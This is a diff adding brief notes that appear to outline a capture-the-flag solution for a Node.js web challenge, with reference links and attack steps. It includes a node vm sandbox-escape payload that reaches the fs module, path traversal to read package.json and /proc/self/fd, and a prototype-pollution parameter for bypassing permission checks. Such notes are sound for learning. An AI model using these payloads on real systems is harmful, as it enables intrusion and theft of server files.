@@ -1,0 +1,25 @@
+/api/path.json
+/api/path.json?in_path=1/bar
+/api/path.json?in_path=1/bar&out_path=response/data
+/api/path.json?in_path=(1+1)/bar&out_path=response/data
+/activate?code=...
+/eval_settings?eval=on
+/prefix_settings?prefix=
+middleware that blocks urls that end with `settings`
+
+https://www.npmjs.com/package/jailed
+https://www.npmjs.com/package/qs
+https://stackoverflow.com/questions/20476872/what-is-the-reasoning-chrome-resolves-double-dot-in-uri
+https://thegoodhacker.com/posts/the-unsecure-node-vm-module/
+this.constructor.constructor("return process.mainModule.require('fs')")()
+
+https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
+https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
+
+get /api/./../package.json
+find server source in dependencies
+use out_path[]=constructor/prototype/activated to escape permission control
+get /activate for flag1
+get /eval_settings/?eval=on
+use jsfuck to read /proc/self/fdX to read flag2 and store to /tmp
+use path traversal to retrieve flag2
